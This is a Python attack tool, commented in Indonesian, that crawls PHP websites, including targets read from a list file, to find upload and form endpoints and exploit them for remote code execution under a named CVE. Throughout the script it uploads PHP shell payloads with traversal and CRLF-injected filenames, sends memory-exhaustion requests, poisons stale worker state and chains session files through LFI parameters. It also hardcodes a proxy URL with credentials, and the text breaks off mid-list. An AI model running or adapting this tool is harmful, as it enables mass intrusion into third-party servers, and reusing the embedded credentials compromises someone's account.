#!/usr/bin/env python3
"""
find_php2shell_uploads.py  (v2)
Cari upload endpoint + exploit php2shell (CVE-2026-109618 / 109619).

Perbaikan v2:
  * deteksi CDN (Cloudflare) -> peringatan keep-alive
  * --origin-ip untuk bypass CDN (wajib agar uji stale valid)
  * probe POST-fallback (endpoint POST-only tidak lagi terlewat)
  * pencari reflector otomatis
  * probe versi PHP via easter-egg expose_php
  * --verify untuk konfirmasi ulang temuan
"""
import argparse
import csv
import hashlib
import json
import os
import random
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, urldefrag, urlunparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_PROXY = "http://user27:0gyFoPKC63IU@proxy.hypeproxy.site:1027"

HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
}

PATCHED = {(8, 5): 12, (8, 4): 27, (8, 3): 36, (8, 2): 35}

# wordlist diperluas: pemroses form, route CI, uploader generik
CANDIDATE_PATHS = [
    "/index.php",
    "/proses-pengaduan", "/form-pengaduan", "/suplier-submit",
    "/Service/submit_jemput_zakat", "/form-jemput-zakat", "/kirim",
    "/Epertimbangan/submit_form_permohonan", "/Epertimbangan/submit_form_calon",
    "/epertimbangan/check_code", "/register-label-taat-zakat",
    "/assets/captcha/captcha.php", "/assets/captcha/verifycaptcha.php",
    "/upload", "/uploads", "/upload.php", "/uploader", "/uploader.php",
    "/fileupload.php", "/uploadfile.php", "/ajax/upload", "/api/upload",
    "/api/v1/upload", "/media/upload", "/connector.php",
    "/kontak", "/contact", "/submit", "/daftar", "/register",
]

REFLECT_FIELDS = ["q", "s", "search", "nama", "name", "email", "isi", "pesan",
                  "kodeunik", "uniq_code", "code", "tipe", "id", "key", "value",
                  "p2s_reflect"]

SKIP_EXT = re.compile(r"\.(jpg|jpeg|png|gif|svg|webp|ico|css|js|woff2?|ttf|eot|"
                      r"mp4|mp3|pdf|zip|rar)$", re.I)
PHP_VER_RE = re.compile(r"PHP/(\d+\.\d+\.\d+)", re.I)
PHP_VER_HTML_RE = re.compile(r"PHP Version\s+(\d+\.\d+\.\d+)", re.I)
FILE_INPUT_RE = re.compile(r"^file$", re.I)
MEM_ERR_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted", re.I)
POSTMAX_RE = re.compile(r"(POST Content-Length.*?exceeds|post_max_size)", re.I)
PHP_EGG = "?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"

RUN_MARKER = "P2S_" + "".join(random.choice("abcdef0123456789") for _ in range(8))

RANK_VERDICT = {
    9: "RCE-CONFIRMED", 8: "RCE-VIA-STALE", 7: "STALE-CONTROL",
    6: "SHELL-UPLOAD", 5: "OOM-RECOVERY", 4: "STALE-STATE",
    3: "OOM-TRIGGERED", 2: "CRASH", 1: "SUSPECT", 0: "MULTIPART-OK",
}
DEFAULT_LFI_PARAMS = ["file", "page", "p", "view", "include", "path", "url",
                      "src", "f", "halaman", "template", "inc"]


# ----------------------------------------------------------------------
def build_session(proxy, verify, pin=False):
    s = requests.Session()
    retry = Retry(total=2, backoff_factor=0.5,
                  status_forcelist=[429, 500, 502, 503, 504], allowed_methods=None)
    kw = dict(max_retries=0 if pin else retry)
    if pin:
        kw.update(pool_connections=1, pool_maxsize=1, pool_block=True)
    s.mount("https://", HTTPAdapter(**kw))
    s.mount("http://", HTTPAdapter(**kw))
    s.headers.update(HEADERS)
    if pin:
        s.headers["Connection"] = "keep-alive"
    s.verify = verify
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


def normalize(target):
    t = target.strip()
    if not t:
        return []
    return [t] if re.match(r"^https?://", t, re.I) else [f"https://{t}", f"http://{t}"]


def same_host(a, b):
    try:
        return urlparse(a).netloc.lower() == urlparse(b).netloc.lower()
    except Exception:
        return False


def vuln_status(ver):
    if not ver:
        return "unknown"
    try:
        t = tuple(int(x) for x in ver.split("."))
    except Exception:
        return "unknown"
    if len(t) < 3:
        return "unknown"
    key = (t[0], t[1])
    if key in PATCHED:
        return "VULNERABLE" if t[2] < PATCHED[key] else "patched"
    return "unknown"


def fetch(session, url, method="GET", timeout=10, **kw):
    try:
        return session.request(method, url, timeout=timeout,
                               allow_redirects=True, **kw)
    except requests.RequestException:
        return None


def _bump(best, rank, verdict, name, why):
    return (rank, verdict, name, why) if rank > best[0] else best


def rewrite_origin(url, origin_ip, scheme=None):
    p = urlparse(url)
    netloc = origin_ip + (f":{p.port}" if p.port else "")
    return urlunparse((scheme or p.scheme, netloc, p.path, p.params, p.query, p.fragment))


# ----------------------------------------------------------------------
# Discovery
# ----------------------------------------------------------------------
def extract_forms(html, base_url):
    out = []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return out
    for form in soup.find_all("form"):
        action = urljoin(base_url, (form.get("action") or base_url).split("#")[0])
        method = (form.get("method") or "GET").upper()
        enctype = (form.get("enctype") or "").lower()
        ff = [i.get("name") or "(no-name)"
              for i in form.find_all("input", {"type": FILE_INPUT_RE})]
        names = [i.get("name") for i in form.find_all(["input", "select", "textarea"])
                 if i.get("name")]
        out.append({"action": action, "method": method,
                    "enctype": enctype or ("multipart/form-data" if ff else ""),
                    "file_fields": ff, "field_names": names,
                    "multipart": "multipart/form-data" in enctype or bool(ff),
                    "source": "form"})
    return out


def extract_links(html, base_url):
    links = []
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception:
        return links
    for a in soup.find_all("a", href=True):
        href = a["href"].strip()
        if href.startswith(("mailto:", "tel:", "javascript:", "#")):
            continue
        u = urldefrag(urljoin(base_url, href))[0]
        if same_host(u, base_url) and not SKIP_EXT.search(u):
            links.append(u)
    return links


def fingerprint(resp):
    """php + sapi + cdn sekaligus."""
    if resp is None:
        return {}, {}
    h = resp.headers
    blob = h.get("X-Powered-By", "") + " " + h.get("Server", "")
    m = PHP_VER_RE.search(blob)
    sc = h.get("Set-Cookie", "")
    php = {"php_version": m.group(1) if m else None,
           "phpsessid": "PHPSESSID" in sc,
           "is_php": bool(m) or "PHPSESSID" in sc
                     or ".php" in urlparse(resp.url).path.lower()}

    srv = (h.get("Server", "") or "").lower()
    cdn = None
    if h.get("cf-ray") or "cloudflare" in srv:
        cdn = "cloudflare"
    elif h.get("x-cache") or h.get("x-amz-cf-id") or "cloudfront" in srv:
        cdn = "cloudfront"
    elif "akamai" in srv or h.get("x-akamai-transformed"):
        cdn = "akamai"
    elif h.get("x-served-by") and h.get("x-cache"):
        cdn = "fastly"

    if "apache" in srv and (h.get("X-Powered-By", "").lower().startswith("php")):
        sapi = {"sapi": "apache-mod_php", "priority": "HIGH"}
    elif "apache" in srv:
        sapi = {"sapi": "apache", "priority": "MED"}
    elif "nginx" in srv:
        sapi = {"sapi": "nginx", "priority": "LOW"}
    elif h.get("X-Powered-By"):
        sapi = {"sapi": h["X-Powered-By"], "priority": "MED"}
    else:
        sapi = {"sapi": "unknown", "priority": "LOW"}
    sapi["server_header"] = h.get("Server", "(none)")
    sapi["cdn"] = cdn
    return php, sapi


def php_version_probe(session, base, timeout):
    """Coba bocorkan versi PHP (expose_php easter egg)."""
    for u in (urljoin(base, "/index.php" + PHP_EGG), urljoin(base, "/" + PHP_EGG)):
        r = fetch(session, u, timeout=timeout)
        if r is None:
            continue
        m = PHP_VER_HTML_RE.search(r.text) or PHP_VER_RE.search(r.text)
        if m:
            return m.group(1)
    return None


def probe_endpoints(session, base, timeout):
    """GET dulu; kalau 404/405 coba POST multipart (endpoint POST-only)."""
    root = f"{urlparse(base).scheme}://{urlparse(base).netloc}"
    out = []
    for path in CANDIDATE_PATHS:
        url = urljoin(root + "/", path.lstrip("/"))
        r = fetch(session, url, timeout=timeout)
        if r is None:
            continue
        method, status = "POST", None
        if r.status_code in (404, 405):
            bnd = b"p2sprobe"
            body = build_multipart(bnd, [_part("p2s_probe", b"1")])
            r2 = fetch(session, url, method="POST", timeout=timeout, data=body,
                       headers={"Content-Type": "multipart/form-data; boundary=p2sprobe"})
            if r2 is None or r2.status_code in (404, 405):
                continue
            status = r2.status_code
            final = r2.url
        else:
            status = r.status_code
            final = r.url
        out.append({"action": final, "method": method,
                    "enctype": "multipart/form-data", "file_fields": [],
                    "field_names": [], "multipart": True, "source": "probe",
                    "status": status,
                    "is_php": ".php" in urlparse(final).path.lower()})
    return out


def find_reflector(session, url, marker, timeout):
    """Cari field yang nilainya dipantulkan di respons -> bahan deteksi bleed."""
    hits = []
    bnd = b"p2srefl"
    ctype = "multipart/form-data; boundary=p2srefl"
    body = build_multipart(bnd, [_part(f, marker.encode()) for f in REFLECT_FIELDS])
    r, _ = post_raw(session, url, body, ctype, timeout, 1)
    if r is not None and marker in r.text:
        for f in REFLECT_FIELDS:
            b2 = build_multipart(bnd, [_part(f, marker.encode())])
            r2, _ = post_raw(session, url, b2, ctype, timeout, 1)
            if r2 is not None and marker in r2.text:
                hits.append("POST:" + f)
    # GET query
    for f in REFLECT_FIELDS[:6]:
        r = fetch(session, url, timeout=timeout, params={f: marker})
        if r is not None and marker in r.text:
            hits.append("GET:" + f)
    return hits


# ======================================================================
# multipart utils
# ======================================================================
def _part(name, data, filename=None, ctype=None):
    return {"name": name, "data": data, "filename": filename, "ctype": ctype}


def build_multipart(boundary, parts, close=True, final_crlf=True):
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        disp = 'Content-Disposition: form-data; name="%s"' % p["name"]
        if p["filename"] is not None:
            disp += '; filename="%s"' % p["filename"]
        out += disp.encode("utf-8", "surrogateescape") + b"\r\n"
        if p.get("ctype"):
            out += ("Content-Type: %s\r\n" % p["ctype"]).encode() + b"\r\n"
        out += b"\r\n" + p["data"] + b"\r\n"
    if close:
        out += b"--" + boundary + b"--"
        if final_crlf:
            out += b"\r\n"
    return bytes(out)


def resp_fp(r):
    return {"status": r.status_code, "len": len(r.content),
            "sha1": hashlib.sha1(r.content).hexdigest(),
            "ct": r.headers.get("Content-Type", ""),
            "cookies": sorted(set(r.cookies.keys())),
            "location": r.headers.get("Location", ""),
            "conn": r.headers.get("Connection", "")}


def _diff(base, cur):
    out = []
    if base["status"] != cur["status"]:
        out.append(f"status {base['status']}->{cur['status']}")
    if base["sha1"] != cur["sha1"] and abs(base["len"] - cur["len"]) > 8:
        out.append(f"len {base['len']}->{cur['len']}")
    if base["ct"] != cur["ct"]:
        out.append("content-type beda")
    if set(cur["cookies"]) - set(base["cookies"]):
        out.append("cookie baru")
    if base["location"] != cur["location"]:
        out.append("redirect beda")
    return out


def post_raw(session, url, body, ctype, timeout, retries=1):
    last = None
    for _ in range(max(1, retries)):
        t0 = time.time()
        r = fetch(session, url, method="POST", timeout=timeout, data=body,
                  headers={"Content-Type": ctype})
        if r is not None:
            return r, int((time.time() - t0) * 1000)
        last = r
    return last, 0


# ======================================================================
# ENGINE
# ======================================================================
def marker_battery(session, url, marker, timeout, retries, base_fp, base_txt):
    seed = "p2s" + os.urandom(2).hex()
    php = ('<?php echo "%s"; ?>' % marker).encode()
    rows, best = [], (0, "", "", "")

    def V(name, parts, boundary=None, close=True, final_crlf=True):
        return {"name": name, "boundary": boundary or (seed + name).encode(),
                "parts": parts, "close": close, "final_crlf": final_crlf}

    variants = [
        V("baseline", [_part("file", b"hello", "test.txt", "text/plain")]),
        V("session-progress",
          [_part("PHP_SESSION_UPLOAD_PROGRESS", b"p"),
           _part("file", php, "shell.php", "application/octet-stream")]),
        V("long-filename", [_part("file", php, "A" * 300 + ".php",
                                  "application/octet-stream")]),
        V("crlf-filename", [_part("file", php, "sh\r\nX-Inj: 1\r\nell.php",
                                  "application/octet-stream")]),
        V("nested-fields", [_part("a[b][c][d]", b"x"),
                            _part("file", php, "shell.php",
                                  "application/octet-stream")]),
        V("many-parts", [_part("p%d" % i, b"v") for i in range(200)] +
                        [_part("file", php, "shell.php", "application/octet-stream")]),
        V("no-close-boundary", [_part("file", php, "shell.php",
                                      "application/octet-stream")], close=False),
        V("no-final-crlf", [_part("file", php, "shell.php",
                                  "application/octet-stream")], final_crlf=False),
        V("huge-header", [_part("X" * 4000, b"v"),
                          _part("file", php, "shell.php",
                                "application/octet-stream")]),
        V("traversal-filename", [_part("file", php, "../../shell.php",
                                       "application/octet-stream")]),
        V("unicode-filename", [_part("file", php, "sh\u00e9ll\u65e5.php",
                                     "application/octet-stream")]),
        V("special-boundary", [_part("file", php, "shell.php",
                                     "application/octet-stream")],
          boundary=(seed + "-b.+x").encode()),
    ]
    for v in variants:
        body = build_multipart(v["boundary"], v["parts"],
                               close=v["close"], final_crlf=v["final_crlf"])
        ctype = "multipart/form-data; boundary=%s" % v["boundary"].decode()
        r, ms = post_raw(session, url, body, ctype, timeout, retries)
        row = {"name": v["name"], "status": None, "ms": ms, "diff": []}
        if r is not None:
            txt = r.text
            row["status"] = r.status_code
            row["diff"] = _diff(base_fp, resp_fp(r))
            if marker in txt and marker not in base_txt:
                best = _bump(best, 9, "RCE-CONFIRMED", v["name"], "marker tereksekusi")
            elif "<?php" in txt and "<?php" not in base_txt:
                best = _bump(best, 6, "SHELL-UPLOAD", v["name"], "isi .php terpantul")
            elif r.status_code >= 500 and base_fp["status"] < 500:
                best = _bump(best, 2, "CRASH", v["name"], f"HTTP {r.status_code}")
            elif row["diff"]:
                best = _bump(best, 1, "SUSPECT", v["name"], ", ".join(row["diff"]))
        rows.append(row)
    return rows, best


def oom_battery(session, url, marker, sizes_mb, timeout, base_fp):
    rows, best = [], (0, "", "", "")
    for mb in sizes_mb:
        bnd = ("p2soom%d" % mb).encode()
        body = build_multipart(bnd, [_part("p2s_pad", b"A" * (mb * 1024 * 1024)),
                                     _part("p2s_canary", marker.encode())])
        ctype = "multipart/form-data; boundary=%s" % bnd.decode()
        r, ms = post_raw(session, url, body, ctype, timeout, retries=1)
        row = {"size_mb": mb, "status": None, "ms": ms, "mem_limit": None,
               "post_too_big": False, "diff": []}
        if r is not None:
            txt = r.text
            row["status"] = r.status_code
            m = MEM_ERR_RE.search(txt)
            if m:
                row["mem_limit"] = int(m.group(1))
            row["post_too_big"] = bool(POSTMAX_RE.search(txt))
            row["diff"] = _diff(base_fp, resp_fp(r))
            if m:
                if r.status_code < 500 and row["diff"]:
                    best = _bump(best, 5, "OOM-RECOVERY", f"pad {mb}MB",
                                 f"memory_limit {row['mem_limit']}B lalu recovery")
                else:
                    best = _bump(best, 3, "OOM-TRIGGERED", f"pad {mb}MB",
                                 f"Allowed memory size exhausted ({row['mem_limit']}B)")
            elif r.status_code >= 500 and base_fp["status"] < 500 and not row["post_too_big"]:
                best = _bump(best, 3, "OOM-TRIGGERED", f"pad {mb}MB",
                             f"HTTP {r.status_code} pada {mb}MB")
        rows.append(row)
    return rows, best


def stale_battery(session, url, marker, iterations, timeout):
    ctype = "multipart/form-data; boundary=p2sstale"
    poison = build_multipart(b"p2sstale", [_part("p2s_canary", marker.encode()),
                                           _part("p2s_aux", b"poison")])
    victim = build_multipart(b"p2sstale", [_part("p2s_aux", b"victim")])

    cold = []
    for _ in range(3):
        r, _ = post_raw(session, url, victim, ctype, timeout, retries=0)
        cold.append(resp_fp(r) if r is not None else None)
    if cold[0] is None:
        return [], (0, "", "", "")

    # variansi kontrol: request identik harus identik
    cold_variance = len({c["sha1"] for c in cold if c}) > 1

    bleeds, rows = 0, []
    for i in range(iterations):
        post_raw(session, url, poison, ctype, timeout, retries=0)
        r, _ = post_raw(session, url, victim, ctype, timeout, retries=0)
        if r is None:
            rows.append({"iter": i, "bleed": False, "diff": []})
            continue
        seen = marker in r.text
        diff = _diff(cold[0], resp_fp(r))
        bleed = seen or bool(diff)
        bleeds += bleed
        rows.append({"iter": i, "bleed": bleed, "marker": seen, "diff": diff})

    best = (0, "", "", "")
    if bleeds:
        rate = bleeds / max(1, iterations)
        if bleeds >= 2 or rate >= 0.3:
            best = _bump(best, 4, "STALE-STATE", "poison->victim",
                         f"bleed {bleeds}/{iterations}")
        else:
            best = _bump(best, 1, "SUSPECT", "poison->victim",
                         f"bleed lemah {bleeds}/{iterations}")
    if cold_variance and not bleeds:
        best = _bump(best, 1, "SUSPECT", "kontrol",
                     "request identik menghasilkan body berbeda (worker tidak stabil)")
    return rows, best


def stale_control_engine(session, url, marker, timeout, reflector_fields):
    best, findings = (0, "", "", ""), []
    seed = os.urandom(2).hex()
    bnd = ("p2sc" + seed).encode()
    ctype = "multipart/form-data; boundary=%s" % bnd.decode()
    poison_php = '<?php echo "%s"; ?>' % marker
    poison_bare = 'echo "%s";' % marker

    def trig_empty():
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("p2s_aux", b"t")]),
                     headers={"Content-Type": ctype})

    def trig_get():
        return fetch(session, url, timeout=timeout)

    def trig_file():
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("file", b"z", "f.txt",
                                                      "text/plain")]),
                     headers={"Content-Type": ctype})

    triggers = [("empty", trig_empty), ("get", trig_get), ("file-only", trig_file)]

    # kanal poison -> (nama, pemanggil)
    def ch_field(v):
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("p2s_poison", v.encode())]),
                     headers={"Content-Type": ctype})

    def ch_header(v):
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("p2s_aux", b"x")]),
                     headers={"Content-Type": ctype, "X-P2S-Poison": v})

    def ch_cookie(v):
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("p2s_aux", b"x")]),
                     headers={"Content-Type": ctype, "Cookie": "p2s_poison=" + v})

    def ch_filename(v):
        return fetch(session, url, method="POST", timeout=timeout,
                     data=build_multipart(bnd, [_part("file", b"z", v, "text/plain")]),
                     headers={"Content-Type": ctype})

    channels = [("field", ch_field), ("header", ch_header),
                ("cookie", ch_cookie), ("filename", ch_filename)]
    # kalau ada reflector, poison lewat field yang benar-benar dipantulkan
    for rf in reflector_fields:
        if rf.startswith("POST:"):
            fname = rf.split(":", 1)[1]
            channels.append((f"reflect:{fname}",
                             lambda v, f=fname: fetch(
                                 session, url, method="POST", timeout=timeout,
                                 data=build_multipart(bnd, [_part(f, v.encode())]),
                                 headers={"Content-Type": ctype})))

    for ch_name, send in channels:
        for pv in (poison_php, poison_bare):
            session.cookies.clear()
            send(pv)
            for tr_name, trig in triggers:
                r = trig()
                if r is None:
                    continue
                txt = r.text
                if (marker in txt) and (pv not in txt):
                    findings.append({"channel": ch_name, "payload": pv,
                                     "trigger": tr_name, "result": "EXECUTED"})
                    best = _bump(best, 8, "RCE-VIA-STALE", f"{ch_name}/{tr_name}",
                                 "poison dieksekusi di request trigger")
                elif pv in txt:
                    findings.append({"channel": ch_name, "payload": pv,
                                     "trigger": tr_name, "result": "CONTROLLED"})
                    best = _bump(best, 7, "STALE-CONTROL", f"{ch_name}/{tr_name}",
                                 f"nilai poison muncul di respons {tr_name}")
    return findings, best


def session_file_chain(session, url, marker, params, timeout):
    sid = "p2s" + os.urandom(4).hex()
    php = ('<?php echo "%s"; ?>' % marker).encode()
    body = build_multipart(b"p2ssess", [_part("PHP_SESSION_UPLOAD_PROGRESS", php),
                                        _part("file", b"AAAA", "f.txt", "text/plain")])
    fetch(session, url, method="POST", timeout=timeout, data=body,
          headers={"Content-Type": "multipart/form-data; boundary=p2ssess",
                   "Cookie": "PHPSESSID=%s" % sid})
    rows = []
    for p in params:
        for cand in (f"/tmp/sess_{sid}", f"/var/lib/php/sessions/sess_{sid}",
                     f"/var/lib/php5/sess_{sid}"):
            r = fetch(session, url, timeout=timeout, params={p: cand})
            if r is None:
                continue
            hit = marker in r.text
            rows.append({"param": p, "path": cand, "status": r.status_code, "marker": hit})
            if hit:
                return rows, (8, "RCE-VIA-STALE", f"sessfile:{p}",
                              f"session file dieksekusi via ?{p}={cand}")
    return rows, (0, "", "", "")


# ---------- orchestrator ----------
def exploit_endpoint(session, ep, args, marker, reflector, host):
    url = ep["action"]
    res = {"url": url, "verdict": "NO-RESPONSE", "evidence": [], "sapi": None,
           "marker": [], "oom": [], "stale": [], "control": [], "sessfile": [],
           "best_rank": 0, "keepalive": True, "reflector": reflector}

    base = fetch(session, url, timeout=args.timeout)
    if base is None:
        return res
    base_fp = resp_fp(base)
    base_txt = base.text
    res["baseline_status"] = base_fp["status"]
    _, sapi = fingerprint(base)
    res["sapi"] = sapi
    if "close" in (base_fp.get("conn") or "").lower():
        res["keepalive"] = False

    ph = args.phase
    best = (0, "", "", "")

    if "marker" in ph or "all" in ph:
        rows, b = marker_battery(session, url, marker, args.exploit_timeout,
                                 args.exploit_retries, base_fp, base_txt)
        res["marker"] = rows
        best = b if b[0] > best[0] else best

    if "oom" in ph or "all" in ph:
        rows, b = oom_battery(session, url, marker, args.oom_sizes,
                              args.exploit_timeout, base_fp)
        res["oom"] = rows
        best = b if b[0] > best[0] else best

    if "stale" in ph or "all" in ph:
        rows, b = stale_battery(session, url, marker, args.stale_iterations,
                                args.exploit_timeout)
        res["stale"] = rows
        best = b if b[0] > best[0] else best

    if "control" in ph or "all" in ph:
        rows, b = stale_control_engine(session, url, marker,
                                       args.exploit_timeout, reflector)
        res["control"] = rows
        best = b if b[0] > best[0] else best

    if "sessfile" in ph or "all" in ph:
        rows, b = session_file_chain(session, url, marker, args.lfi_params,
                                     args.exploit_timeout)
        res["sessfile"] = rows
        best = b if b[0] > best[0] else best

    if best[0] > 0:
        res["best_rank"] = best[0]
        res["verdict"] = RANK_VERDICT.get(best[0], "SUSPECT")
        res["evidence"].append(f"{best[1]}: {best[2]}")
    else:
        res["verdict"] = "MULTIPART-OK"

    # konfirmasi ulang temuan kuat
    if args.verify and best[0] >= 7 and res["control"]:
        confirms = 0
        for _ in range(args.verify):
            rows, b = stale_control_engine(session, url, marker,
                                           args.exploit_timeout, reflector)
            if b[0] >= 7:
                confirms += 1
        res["verify"] = {"runs": args.verify, "confirmed": confirms}
    return res


def analyze_target(target, args, session, expl_session, marker):
    for url in normalize(target):
        host = urlparse(url).netloc
        r = fetch(session, url, timeout=args.timeout)
        if r is None:
            continue
        php, sapi = fingerprint(r)
        if not php.get("php_version"):
            v = php_version_probe(session, r.url, args.timeout)
            if v:
                php["php_version"] = v
                php["is_php"] = True
                php["source"] = "easter-egg"

        rep = {"target": target, "final_url": r.url, "php": php, "sapi": sapi,
               "endpoints": [], "pages_crawled": 0, "exploit": []}

        forms = extract_forms(r.text, r.url)
        if args.depth > 0:
            seen, frontier = {r.url}, [(u, 0) for u in extract_links(r.text, r.url)]
            while frontier and rep["pages_crawled"] < args.max_pages:
                u, d = frontier.pop(0)
                if u in seen:
                    continue
                seen.add(u)
                rr = fetch(session, u, timeout=args.timeout)
                rep["pages_crawled"] += 1
                if rr is None or "html" not in rr.headers.get("Content-Type", ""):
                    continue
                forms.extend(extract_forms(rr.text, rr.url))
                if d + 1 <= args.depth:
                    frontier.extend((x, d + 1) for x in extract_links(rr.text, rr.url))

        eps = list(forms)
        if args.probe_paths:
            eps.extend(probe_endpoints(session, r.url, args.timeout))
        uniq = {}
        for e in eps:
            if not same_host(e["action"], r.url):
                continue
            uniq.setdefault((e["action"], e["method"]), e)
        rep["endpoints"] = list(uniq.values())

        # cari reflector di endpoint POST (dipakai untuk uji control)
        reflectors = {}
        for e in rep["endpoints"]:
            if e["method"] != "POST":
                continue
            hits = find_reflector(expl_session, e["action"], marker, args.timeout)
            if hits:
                reflectors[e["action"]] = hits
        rep["reflectors"] = reflectors

        if args.exploit:
            tg = [e for e in rep["endpoints"] if e["method"] == "POST"
                  and (e.get("multipart") or e.get("is_php") or e.get("file_fields"))]
            if args.only_upload:
                tg = [e for e in tg if e.get("file_fields")]
            # prioritaskan endpoint dengan file upload / reflector
            tg.sort(key=lambda e: (0 if e.get("file_fields") else 1,
                                   0 if e["action"] in reflectors else 1))
            for e in tg[: args.exploit_limit]:
                x = exploit_endpoint(expl_session, e, args, marker,
                                     reflectors.get(e["action"], []), host)
                x["source"] = e["source"]
                rep["exploit"].append(x)
                if args.verbose:
                    print(f"    ~ {x['verdict']:14} {e['action']}")
        return rep
    return {"target": target, "error": "unreachable", "endpoints": [], "exploit": []}


# ----------------------------------------------------------------------
def print_report(rep):
    if rep.get("error"):
        print(f"[-] {rep['target']} – {rep['error']}")
        return
    php = rep.get("php") or {}
    sapi = rep.get("sapi") or {}
    ver = php.get("php_version")
    tag = {"VULNERABLE": " [VULNERABLE]", "patched": " [patched]"}.get(vuln_status(ver), "")
    print(f"\n=== {rep['final_url']} ===")
    print(f"    Server: {sapi.get('server_header', '?')}")
    print(f"    SAPI: {sapi.get('sapi')}  CDN: {sapi.get('cdn') or '-'}  PHP: {ver or '?'}{tag}")
    if sapi.get("cdn"):
        print(f"    !! di belakang CDN ({sapi['cdn']}) -> uji stale WAJIB pakai --origin-ip")
    if rep.get("reflectors"):
        print(f"    reflector: {rep['reflectors']}")
    mp = [e for e in rep["endpoints"] if e.get("multipart")]
    up = [e for e in rep["endpoints"] if e.get("file_fields")]
    print(f"    pages={rep.get('pages_crawled', 0)} multipart={len(mp)} upload={len(up)}")
    for e in rep["endpoints"]:
        m = []
        if e.get("file_fields"):
            m.append("file=" + ",".join(e["file_fields"]))
        if e.get("is_php"):
            m.append("php")
        if e["action"] in (rep.get("reflectors") or {}):
            m.append("REFLECT")
        print(f"      [{e['source']:5}] {e['method']:4} {e['action']}"
              f"{('  ' + ' '.join(m)) if m else ''}")

    for x in rep.get("exploit", []):
        icon = {"RCE-CONFIRMED": "[!!!]", "RCE-VIA-STALE": "[!!!]",
                "STALE-CONTROL": "[!! ]", "SHELL-UPLOAD": "[!! ]",
                "OOM-RECOVERY": "[!  ]", "OOM-TRIGGERED": "[!  ]"}.get(x["verdict"], "[   ]")
        ka = "" if x.get("keepalive", True) else "  (keep-alive OFF!)"
        vf = ""
        if x.get("verify"):
            vf = f"  verify {x['verify']['confirmed']}/{x['verify']['runs']}"
        print(f"    {icon} {x['verdict']:14} POST {x['url']}{ka}{vf}")
        for ev in x["evidence"]:
            print(f"          -> {ev}")
        for f in x.get("control", [])[:8]:
            print(f"          . {f.get('result','?'):10} ch={f.get('channel')} tr={f.get('trigger')}")
        for row in x.get("oom", []):
            if row.get("status") and (row.get("mem_limit") or row["status"] >= 500):
                print(f"          . pad {row['size_mb']}MB status={row['status']} mem={row.get('mem_limit')}")


def main():
    ap = argparse.ArgumentParser(description="Cari + exploit php2shell (v2)")
    ap.add_argument("target")
    ap.add_argument("-o", "--output")
    ap.add_argument("--csv")
    ap.add_argument("-t", "--threads", type=int, default=6)
    ap.add_argument("--timeout", type=float, default=12)
    ap.add_argument("--depth", type=int, default=1)
    ap.add_argument("--max-pages", type=int, default=40)
    ap.add_argument("--proxy", default=DEFAULT_PROXY)
    ap.add_argument("--no-proxy", action="store_true")
    ap.add_argument("--origin-ip", help="IP origin untuk bypass CDN (keep-alive jadi valid)")
    ap.add_argument("--verify-ssl", action="store_true", default=False)
    ap.add_argument("--no-probe-paths", dest="probe_paths", action="store_false", default=True)

    ap.add_argument("--exploit", action="store_true")
    ap.add_argument("--phase", default="all",
                    help="marker,oom,stale,control,sessfile,all")
    ap.add_argument("--only-upload", action="store_true")
    ap.add_argument("--exploit-limit", type=int, default=8)
    ap.add_argument("--exploit-timeout", type=float, default=30)
    ap.add_argument("--exploit-retries", type=int, default=2)
    ap.add_argument("--oom-sizes", default="1,4,8,16,32")
    ap.add_argument("--stale-iterations", type=int, default=10)
    ap.add_argument("--lfi-params", default=",".join(DEFAULT_LFI_PARAMS))
    ap.add_argument("--direct", action="store_true")
    ap.add_argument("--verify", type=int, default=0, help="ulangi temuan kuat N kali")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    args.phase = [p.strip() for p in args.phase.split(",")]
    args.oom_sizes = [int(x) for x in args.oom_sizes.split(",") if x.strip()]
    args.lfi_params = [p.strip() for p in args.lfi_params.split(",") if p.strip()]

    proxy = None if args.no_proxy else args.proxy
    expl_proxy = None if (args.no_proxy or args.direct) else proxy
    marker = RUN_MARKER

    if os.path.isfile(args.target):
        with open(args.target, encoding="utf-8") as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    else:
        targets = [args.target]

    print(f"[*] {len(targets)} target | phase={','.join(args.phase)} | "
          f"marker={marker} | origin_ip={args.origin_ip or '-'}\n")

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(analyze_target, t, args,
                          build_session(proxy, args.verify_ssl),
                          build_session(expl_proxy, args.verify_ssl, pin=True),
                          marker): t for t in targets}
        for fut in as_completed(futs):
            try:
                rep = fut.result()
            except Exception as e:
                rep = {"target": futs[fut], "error": f"{e.__class__.__name__}: {e}",
                       "endpoints": [], "exploit": []}
            results.append(rep)
            print_report(rep)

    bucket = {}
    for r in results:
        for x in r.get("exploit", []):
            bucket.setdefault(x["verdict"], []).append((r.get("final_url"), x["url"]))
    vuln = [r for r in results
            if vuln_status((r.get("php") or {}).get("php_version")) == "VULNERABLE"]

    print("\n" + "=" * 66)
    print(f"[SUMMARY] target        : {len(results)}")
    print(f"[SUMMARY] PHP VULNERABLE: {len(vuln)}")
    for v in ["RCE-CONFIRMED", "RCE-VIA-STALE", "STALE-CONTROL", "SHELL-UPLOAD",
